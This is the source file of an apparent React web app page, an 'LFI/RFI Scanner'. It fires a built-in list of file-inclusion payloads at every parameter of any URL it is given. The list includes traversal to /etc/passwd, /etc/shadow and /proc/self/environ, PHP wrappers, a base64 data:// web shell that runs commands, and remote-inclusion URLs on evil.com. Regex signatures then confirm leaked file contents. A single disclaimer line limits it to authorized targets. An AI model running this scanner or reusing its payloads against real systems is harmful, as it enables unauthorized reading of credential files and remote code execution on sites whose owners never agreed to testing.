import { useState } from "react";
import { motion } from "framer-motion";
import {
  ArrowLeft,
  Search,
  Loader2,
  Globe,
  CheckCircle,
  XCircle,
  Copy,
  Check,
  AlertTriangle,
  FolderOpen,
  Shield,
  RefreshCw,
} from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Badge } from "@/components/ui/badge";

import { proxyFetch } from "@/lib/proxyFetch";

// ─── LFI/RFI Payloads ────────────────────────────────────────────────────────

interface PayloadEntry {
  payload: string;
  label: string;
  type: "LFI" | "RFI";
  os: "linux" | "windows" | "php" | "generic";
  target: string; // what we're trying to access
}

const LFI_RFI_PAYLOADS: PayloadEntry[] = [
  // ─── Linux LFI ───────────────────────────────────────────
  { payload: "../../../../../../etc/passwd", label: "Passwd 6-deep", type: "LFI", os: "linux", target: "/etc/passwd" },
  { payload: "../../../../etc/passwd", label: "Passwd 4-deep", type: "LFI", os: "linux", target: "/etc/passwd" },
  { payload: "../../../etc/passwd", label: "Passwd 3-deep", type: "LFI", os: "linux", target: "/etc/passwd" },
  { payload: "....//....//....//....//etc/passwd", label: "Double-encode", type: "LFI", os: "linux", target: "/etc/passwd" },
  { payload: "..%2F..%2F..%2F..%2Fetc%2Fpasswd", label: "URL-encoded", type: "LFI", os: "linux", target: "/etc/passwd" },
  { payload: "..%252F..%252F..%252Fetc%252Fpasswd", label: "Double URL-enc", type: "LFI", os: "linux", target: "/etc/passwd" },
  { payload: "....%2F....%2F....%2Fetc%2Fpasswd", label: "Mixed encode", type: "LFI", os: "linux", target: "/etc/passwd" },
  { payload: "/etc/passwd", label: "Absolute path", type: "LFI", os: "linux", target: "/etc/passwd" },
  { payload: "....//....//....//etc/shadow", label: "Shadow (double)", type: "LFI", os: "linux", target: "/etc/shadow" },
  { payload: "../../../../etc/hostname", label: "Hostname", type: "LFI", os: "linux", target: "/etc/hostname" },
  { payload: "../../../../etc/hosts", label: "Hosts file", type: "LFI", os: "linux", target: "/etc/hosts" },
  { payload: "../../../../etc/issue", label: "OS Issue", type: "LFI", os: "linux", target: "/etc/issue" },
  // ─── PHP Wrapper LFI ────────────────────────────────────
  { payload: "php://filter/convert.base64-encode/resource=/etc/passwd", label: "php://filter", type: "LFI", os: "php", target: "/etc/passwd (base64)" },
  { payload: "php://input", label: "php://input", type: "LFI", os: "php", target: "stdin" },
  { payload: "php://fd/0", label: "php://fd/0", type: "LFI", os: "php", target: "stdin" },
  { payload: "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4=", label: "data:// wrapper", type: "LFI", os: "php", target: "php exec" },
  { payload: "expect://id", label: "expect:// wrapper", type: "LFI", os: "php", target: "command exec" },
  // ─── Windows LFI ────────────────────────────────────────
  { payload: "..\\..\\..\\..\\..\\windows\\win.ini", label: "win.ini 5-deep", type: "LFI", os: "windows", target: "win.ini" },
  { payload: "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", label: "Windows hosts", type: "LFI", os: "windows", target: "Windows hosts" },
  { payload: "....\\....\\....\\....\\windows\\win.ini", label: "Double-backslash", type: "LFI", os: "windows", target: "win.ini" },
  { payload: "C:\\windows\\win.ini", label: "Absolute Windows", type: "LFI", os: "windows", target: "win.ini" },
  // ─── Null byte (legacy) ─────────────────────────────────
  { payload: "../../../../../../etc/passwd%00", label: "Null byte", type: "LFI", os: "generic", target: "/etc/passwd (null)" },
  { payload: "../../../../../../etc/passwd%00.jpg", label: "Null + ext", type: "LFI", os: "generic", target: "/etc/passwd (null+ext)" },
  { payload: "../../../../../../etc/passwd....", label: "Dot truncation", type: "LFI", os: "generic", target: "/etc/passwd (dots)" },
  // ─── Log poisoning / common files ────────────────────────
  { payload: "../../../../../../var/log/apache2/access.log", label: "Apache log", type: "LFI", os: "linux", target: "Apache access log" },
  { payload: "../../../../../../var/log/nginx/access.log", label: "Nginx log", type: "LFI", os: "linux", target: "Nginx access log" },
  { payload: "../../../../../../proc/self/environ", label: "proc/self/environ", type: "LFI", os: "linux", target: "Environment vars" },
  { payload: "../../../../../../proc/self/cmdline", label: "proc/self/cmdline", type: "LFI", os: "linux", target: "Command line" },
  { payload: "../../../../../../proc/version", label: "proc/version", type: "LFI", os: "linux", target: "Kernel version" },
  { payload: "/proc/self/environ", label: "proc env absolute", type: "LFI", os: "linux", target: "Environment vars" },
  // ─── RFI ────────────────────────────────────────────────
  { payload: "http://evil.com/shell.txt", label: "Remote HTTP", type: "RFI", os: "generic", target: "Remote file" },
  { payload: "https://evil.com/shell.txt", label: "Remote HTTPS", type: "RFI", os: "generic", target: "Remote file" },
  { payload: "ftp://evil.com/shell.txt", label: "Remote FTP", type: "RFI", os: "generic", target: "Remote file" },
  // ─── PHP session ────────────────────────────────────────
  { payload: "../../../../../../tmp/sess_<PHPSESSID>", label: "PHP session file", type: "LFI", os: "php", target: "Session file" },
  { payload: "/var/lib/php/sessions/sess_<PHPSESSID>", label: "Session (alt)", type: "LFI", os: "php", target: "Session file" },
  { payload: "php://session.upload_progress", label: "Session upload", type: "LFI", os: "php", target: "Upload progress" },
];

// ─── Detection Patterns ──────────────────────────────────────────────────────

const FILE_SIGNATURES: Array<{ pattern: RegExp; label: string; file: string }> = [
  // /etc/passwd
  { pattern: /root:x:0:0|root:0:0:/, label: "passwd found", file: "/etc/passwd" },
  { pattern: /daemon:x:|nobody:x:|www-data:x:/, label: "passwd users", file: "/etc/passwd" },
  // /etc/shadow
  { pattern: /root:\$|daemon:\$|nobody:\$6?/, label: "shadow found", file: "/etc/shadow" },
  // Windows files
  { pattern: /\[extensions\]|\[fonts\]|\[windows\]/i, label: "win.ini found", file: "win.ini" },
  { pattern: /# Copyright.*Microsoft/, label: "hosts found", file: "Windows hosts" },
  // Apache/Nginx logs
  { pattern: /\d+\.\d+\.\d+\.\d+.*GET\s.*HTTP\/\d\.\d/, label: "access log found", file: "Apache/Nginx log" },
  // Environment
  { pattern: /DOCUMENT_ROOT=|SERVER_SOFTWARE=|HTTP_USER_AGENT=/, label: "environ found", file: "/proc/self/environ" },
  // Kernel
  { pattern: /Linux version \d+\.\d+/, label: "kernel version", file: "/proc/version" },
  // PHP base64 wrapper
  { pattern: /PD9waH[ABCDERFGd]/, label: "base64 encoded PHP", file: "php://filter" },
  // Hostname
  { pattern: /^[a-zA-Z0-9_-]+\s*$/m, label: "hostname detected", file: "/etc/hostname" },
];

// ─── Helpers ─────────────────────────────────────────────────────────────────

function isHtmlResponse(text: string): boolean {
  const t = text.toLowerCase().trim();
  return t.startsWith("<!doctype") || t.startsWith("<html");
}

function extractUrlParams(urlStr: string): string[] {
  try {
    const u = new URL(urlStr);
    return Array.from(u.searchParams.keys());
  } catch {
    return [];
  }
}

function extractFormParams(html: string): string[] {
  const names = new Set<string>();
  const regex = /(?:input|textarea|select)[^>]*\bname=["']([^"']+)["']/gi;
  let m;
  while ((m = regex.exec(html)) !== null) names.add(m[1]);
  return Array.from(names);
}

function detectFileSignatures(response: string): Array<{ label: string; file: string }> {
  const found: Array<{ label: string; file: string }> = [];
  const seen = new Set<string>();
  for (const { pattern, label, file } of FILE_SIGNATURES) {
    if (pattern.test(response) && !seen.has(label)) {
      seen.add(label);
      found.push({ label, file });
    }
  }
  return found;
}

/** Check if response looks like an error (404, 500, etc.) from proxy */
function isErrorResponse(text: string): boolean {
  const t = text.toLowerCase();
  return (
    t.includes("404 not found") ||
    t.includes("500 internal server") ||
    t.includes("403 forbidden") ||
    t.includes("400 bad request") ||
    (t.length < 50 && (t.includes("error") || t.includes("not found")))
  );
}

async function safeFetch(url: string, timeoutMs = 12000): Promise<string> {
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), timeoutMs);
  try {
    const res = await proxyFetch(url, { signal: controller.signal });
    clearTimeout(timer);
    if (!res.ok && res.headers.get("x-proxy-error")) throw new Error(`HTTP ${res.status}`);
    const text = await res.text();
    return text;
  } catch (err) {
    clearTimeout(timer);
    throw err;
  }
}

// ─── UI Components ───────────────────────────────────────────────────────────

function CopyButton({ text }: { text: string }) {
  const [copied, setCopied] = useState(false);
  const handleCopy = () => {
    navigator.clipboard.writeText(text);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };
  return (
    <button onClick={handleCopy} className="text-xs text-muted-foreground hover:text-cyan transition-colors">
      {copied ? <Check className="size-3 text-emerald" /> : <Copy className="size-3" />}
    </button>
  );
}

const typeColors: Record<string, string> = {
  LFI: "border-cyan/40 text-cyan bg-cyan/5",
  RFI: "border-red/40 text-red bg-red/5",
};

// ─── Main Component ──────────────────────────────────────────────────────────

interface LfiRfiScannerProps {
  onBack: () => void;
}

export function LfiRfiScanner({ onBack }: LfiRfiScannerProps) {
  const [url, setUrl] = useState("");
  const [scanning, setScanning] = useState(false);
  const [findings, setFindings] = useState<Array<{
    parameter: string;
    payload: string;
    label: string;
    type: "LFI" | "RFI";
    signatures: Array<{ label: string; file: string }>;
  }>>([]);
  const [paramsFound, setParamsFound] = useState<string[]>([]);
  const [error, setError] = useState<string | null>(null);
  const [scanTime, setScanTime] = useState<number | null>(null);
  const [progress, setProgress] = useState({ current: 0, total: 0 });
  const [scannedParams, setScannedParams] = useState(0);
  const [typeFilter, setTypeFilter] = useState<"all" | "LFI" | "RFI">("all");

  const cleanUrl = (input: string) => {
    let u = input.trim();
    if (!u.startsWith("http")) u = `https://${u}`;
    return u;
  };

  const handleScan = async () => {
    if (!url.trim()) return;
    const target = cleanUrl(url);
    setUrl(target);
    setScanning(true);
    setFindings([]);
    setParamsFound([]);
    setError(null);
    setScanTime(null);
    setScannedParams(0);
    const startTime = Date.now();

    try {
      const html = await safeFetch(target);
      const urlParams = extractUrlParams(target);
      const formParams = extractFormParams(html);
      const allParams = [...new Set([...urlParams, ...formParams])];

      if (allParams.length === 0) {
        setError("No input parameters found. Add query parameters (e.g., ?page=home) or the page must contain HTML forms.");
        setScanTime(Date.now() - startTime);
        setScanning(false);
        return;
      }

      setParamsFound(allParams);
      setProgress({ current: 0, total: allParams.length * LFI_RFI_PAYLOADS.length });

      const allFindings: Array<{
        parameter: string;
        payload: string;
        label: string;
        type: "LFI" | "RFI";
        signatures: Array<{ label: string; file: string }>;
      }> = [];

      for (let pi = 0; pi < allParams.length; pi++) {
        const param = allParams[pi];
        setScannedParams(pi + 1);

        for (let pai = 0; pai < LFI_RFI_PAYLOADS.length; pai++) {
          const { payload, label, type } = LFI_RFI_PAYLOADS[pai];
          setProgress({
            current: pi * LFI_RFI_PAYLOADS.length + pai + 1,
            total: allParams.length * LFI_RFI_PAYLOADS.length,
          });

          try {
            const testUrl = new URL(target);
            testUrl.searchParams.set(param, payload);
            const response = await safeFetch(testUrl.toString(), 10000);

            // Skip error responses
            if (isErrorResponse(response)) continue;

            const signatures = detectFileSignatures(response);

            if (signatures.length > 0) {
              allFindings.push({
                parameter: param,
                payload,
                label,
                type,
                signatures,
              });
            }
          } catch {
            // Skip silently
          }

          await new Promise((r) => setTimeout(r, 100));
        }
      }

      setFindings(allFindings);
      setScanTime(Date.now() - startTime);
    } catch (err) {
      setError(err instanceof Error ? err.message : "Failed to fetch target.");
    } finally {
      setScanning(false);
    }
  };

  const filteredFindings =
    typeFilter === "all" ? findings : findings.filter((f) => f.type === typeFilter);

  const lfiCount = findings.filter((f) => f.type === "LFI").length;
  const rfiCount = findings.filter((f) => f.type === "RFI").length;

  return (
    <motion.div initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} transition={{ duration: 0.3 }} className="min-h-full">
      <div className="max-w-5xl mx-auto px-4 sm:px-6 py-8">
        <Button variant="ghost" size="sm" onClick={onBack} className="gap-2 mb-6 text-muted-foreground hover:text-foreground">
          <ArrowLeft className="size-4" /> Back to Dashboard
        </Button>

        <div className="flex flex-col sm:flex-row items-start gap-6 mb-8">
          <div className="flex size-16 items-center justify-center rounded-2xl shrink-0 bg-cyan/10">
            <FolderOpen className="size-8 text-cyan" />
          </div>
          <div className="flex-1 min-w-0">
            <h1 className="text-2xl sm:text-3xl font-bold tracking-tight mb-2">LFI/RFI Scanner</h1>
            <p className="text-muted-foreground text-base">
              Tests URL parameters against {LFI_RFI_PAYLOADS.length} path traversal and remote
              file inclusion payloads. Detects successful file reads via content signatures.
            </p>
          </div>
        </div>

        {/* Input */}
        <div className="glass-card rounded-2xl p-6 mb-6">
          <label className="text-sm font-medium mb-3 block">Target URL</label>
          <div className="flex gap-3">
            <div className="flex-1 relative">
              <Globe className="absolute left-3 top-1/2 -translate-y-1/2 size-4 text-muted-foreground" />
              <Input
                type="url"
                placeholder="https://example.com/page?file=home"
                value={url}
                onChange={(e) => setUrl(e.target.value)}
                onKeyDown={(e) => e.key === "Enter" && !scanning && handleScan()}
                className="pl-10"
                disabled={scanning}
              />
            </div>
            <Button onClick={handleScan} disabled={scanning || !url.trim()} className="gap-2 bg-cyan hover:bg-cyan/90 text-black font-semibold">
              {scanning ? <Loader2 className="size-4 animate-spin" /> : <Search className="size-4" />}
              {scanning ? "Scanning..." : "Scan LFI/RFI"}
            </Button>
          </div>
          <p className="text-[11px] text-muted-foreground mt-2">
            {LFI_RFI_PAYLOADS.length} payloads — Linux path traversal, PHP wrappers, Windows
            paths, null bytes, log poisoning, and remote file inclusion.
          </p>
        </div>

        {/* Progress */}
        {scanning && (
          <div className="glass-card rounded-xl p-4 mb-6">
            <div className="flex items-center justify-between mb-2">
              <span className="text-xs text-muted-foreground">
                Testing {scannedParams}/{paramsFound.length || "?"} params — {progress.current}/{progress.total} payloads
              </span>
            </div>
            <div className="w-full h-2 bg-muted rounded-full overflow-hidden">
              <motion.div
                className="h-full bg-cyan rounded-full"
                animate={{ width: `${progress.total > 0 ? (progress.current / progress.total) * 100 : 0}%` }}
                transition={{ duration: 0.3 }}
              />
            </div>
          </div>
        )}

        {error && (
          <div className="glass-card rounded-xl p-4 border border-red/20 mb-6">
            <div className="flex items-start gap-3">
              <XCircle className="size-4 text-red shrink-0 mt-0.5" />
              <p className="text-sm text-muted-foreground">{error}</p>
            </div>
          </div>
        )}

        {/* Results */}
        {findings.length > 0 && (
          <motion.div initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} className="space-y-4">
            <div className="flex flex-wrap items-center gap-4 text-xs text-muted-foreground">
              <span>Target: <code className="text-cyan">{url}</code></span>
              {scanTime && <span>Scan time: {(scanTime / 1000).toFixed(1)}s</span>}
              <span>Parameters: {paramsFound.length}</span>
              <span className="text-cyan font-medium">{findings.length} file inclusions</span>
            </div>

            {/* Type badges */}
            <div className="flex gap-2 flex-wrap">
              {lfiCount > 0 && <Badge className="bg-cyan/10 text-cyan border-cyan/30 text-xs">LFI: {lfiCount}</Badge>}
              {rfiCount > 0 && <Badge className="bg-red/10 text-red border-red/30 text-xs">RFI: {rfiCount}</Badge>}
            </div>

            {/* Filter */}
            <div className="flex items-center gap-2">
              <span className="text-xs text-muted-foreground">Type:</span>
              {(["all", "LFI", "RFI"] as const).map((t) => (
                <button
                  key={t}
                  onClick={() => setTypeFilter(t)}
                  className={`px-2.5 py-0.5 rounded-lg text-[11px] font-medium transition-colors ${
                    typeFilter === t
                      ? "bg-cyan/10 text-cyan border border-cyan/30"
                      : "text-muted-foreground hover:text-foreground border border-border/50"
                  }`}
                >
                  {t === "all" ? `All (${findings.length})` : t}
                </button>
              ))}
            </div>

            {/* Findings Table */}
            <div className="glass-card rounded-2xl overflow-hidden">
              <div className="px-5 py-3 border-b border-border/50">
                <h3 className="text-sm font-semibold flex items-center gap-2">
                  <Shield className="size-4 text-cyan" />
                  File Inclusion Findings
                </h3>
              </div>
              <div className="overflow-x-auto max-h-[600px] overflow-y-auto">
                <table className="w-full text-sm">
                  <thead className="sticky top-0 bg-card z-10">
                    <tr className="border-b border-border/50">
                      <th className="text-left px-5 py-2.5 text-xs font-medium text-muted-foreground uppercase">Param</th>
                      <th className="text-left px-5 py-2.5 text-xs font-medium text-muted-foreground uppercase">Payload</th>
                      <th className="text-left px-5 py-2.5 text-xs font-medium text-muted-foreground uppercase">Type</th>
                      <th className="text-left px-5 py-2.5 text-xs font-medium text-muted-foreground uppercase">Detected Files</th>
                      <th className="text-left px-5 py-2.5 text-xs font-medium text-muted-foreground uppercase">Copy</th>
                    </tr>
                  </thead>
                  <tbody>
                    {filteredFindings.map((f, i) => (
                      <tr key={`${f.parameter}-${f.payload}-${i}`} className="border-b border-border/30 last:border-0 hover:bg-muted/30 transition-colors">
                        <td className="px-5 py-2.5">
                          <code className="text-cyan font-mono text-xs">{f.parameter}</code>
                        </td>
                        <td className="px-5 py-2.5">
                          <code className="text-xs font-mono text-muted-foreground break-all">{f.payload.substring(0, 55)}{f.payload.length > 55 ? "..." : ""}</code>
                          <span className="text-[10px] text-muted-foreground ml-2">{f.label}</span>
                        </td>
                        <td className="px-5 py-2.5">
                          <Badge variant="outline" className={`text-[10px] ${typeColors[f.type]}`}>{f.type}</Badge>
                        </td>
                        <td className="px-5 py-2.5">
                          <div className="flex gap-1 flex-wrap">
                            {f.signatures.map((s, j) => (
                              <Badge key={j} variant="outline" className="text-[9px] border-emerald/30 text-emerald">
                                {s.label}
                              </Badge>
                            ))}
                          </div>
                        </td>
                        <td className="px-5 py-2.5">
                          <CopyButton text={`${f.parameter}: ${f.payload}`} />
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            </div>
          </motion.div>
        )}

        {!scanning && findings.length === 0 && paramsFound.length > 0 && !error && (
          <div className="glass-card rounded-2xl p-8 text-center border border-emerald/20">
            <CheckCircle className="size-10 text-emerald mx-auto mb-3" />
            <p className="text-sm font-medium text-emerald mb-1">No LFI/RFI vulnerabilities detected</p>
            <p className="text-xs text-muted-foreground">
              Tested {paramsFound.length} params with {LFI_RFI_PAYLOADS.length} payloads. The target
              may sanitize file paths or restrict directory access.
            </p>
          </div>
        )}

        <div className="glass-card rounded-xl p-4 border border-amber/20 mt-6">
          <div className="flex items-start gap-3">
            <AlertTriangle className="size-4 text-amber shrink-0 mt-0.5" />
            <div className="text-xs text-muted-foreground">
              <p>
                <strong className="text-foreground">How it works:</strong> Injects path traversal
                and remote file inclusion payloads into each parameter. The response is checked
                for file content signatures — passwd user entries, Windows INI headers, Apache
                log patterns, environment variables, and base64-encoded PHP.
              </p>
              <p className="mt-1">
                <strong>Covers:</strong> Linux traversal (3-6 levels deep), PHP wrappers
                (php://filter, php://input, data://, expect://), Windows paths, null byte
                injection, double encoding, and log poisoning paths.
              </p>
              <p className="mt-1 text-amber">
                <strong>Educational use only.</strong> Only scan targets you own or have
                authorization to test.
              </p>
            </div>
          </div>
        </div>
      </div>
    </motion.div>
  );
}
